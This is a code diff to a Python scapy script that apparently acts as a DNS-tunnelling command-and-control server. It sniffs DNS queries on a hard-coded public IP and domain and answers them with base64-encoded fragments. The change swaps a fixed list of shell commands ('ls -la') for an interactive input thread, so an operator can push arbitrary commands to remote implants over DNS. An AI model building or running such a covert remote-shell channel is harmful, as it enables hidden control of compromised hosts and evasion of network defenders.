@@ -2,6 +2,8 @@
 from scapy.all import *
 from base64 import b64encode, b64decode
 
+import threading
+
 PUBLIC_IP = "20.249.220.128"
 IFACE = "eth0"
 DOMAIN = "platypew.social"
@@ -9,7 +11,7 @@ DOMAIN = "platypew.social"
 FRAG_LEN = 70 - len(DOMAIN)
 
 recv = b""
-queue = [b"ls -la", b"ls", b"echo 'a super duper long command that definitely cannot be sent within one packet'"]
+queue = []
 buf = []
 
 
@@ -81,5 +83,15 @@ def pkt_callback(pkt) -> None:
         else:
             reply(pkt)
 
+def user_input():
+    while True:
+        queue.append(input().encode())
 
-sniff(iface=IFACE, prn=pkt_callback, filter="udp dst port 53 and udp[10] & 0x80 = 0", store=0)
+
+def main():
+    threading.Thread(target=user_input).start()
+    sniff(iface=IFACE, prn=pkt_callback, filter="udp dst port 53 and udp[10] & 0x80 = 0", store=0)
+
+
+if __name__ == "__main__":
+    main()
